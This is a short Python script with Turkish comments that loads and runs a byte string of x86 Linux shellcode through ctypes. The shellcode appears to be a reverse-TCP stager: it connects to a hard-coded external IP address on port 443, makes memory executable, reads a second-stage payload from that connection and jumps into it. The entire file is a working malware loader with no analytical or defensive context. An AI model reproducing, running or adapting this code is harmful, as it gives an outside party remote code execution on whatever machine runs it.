import ctypes

buf =  b""
buf += b"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02"
buf += b"\xb0\x66\x89\xe1\xcd\x80\x97\x5b\x68\x51\xa1\xe5"
buf += b"\x28\x68\x02\x00\x01\xbb\x89\xe1\x6a\x66\x58\x50"
buf += b"\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e"
buf += b"\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
buf += b"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27"
buf += b"\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c"
buf += b"\xc1\xe3\x0c\xb0\x7d\xcd\x80\x85\xc0\x78\x10\x5b"
buf += b"\x89\xe1\x99\xb2\x6a\xb0\x03\xcd\x80\x85\xc0\x78"
buf += b"\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
buf += b"\x00\xcd\x80"


# C türüne dönüştürün
shellcode_ptr = ctypes.c_char_p(buf)

# Çalıştırın
shellcode_func = ctypes.cast(shellcode_ptr, ctypes.CFUNCTYPE(None))
shellcode_func()
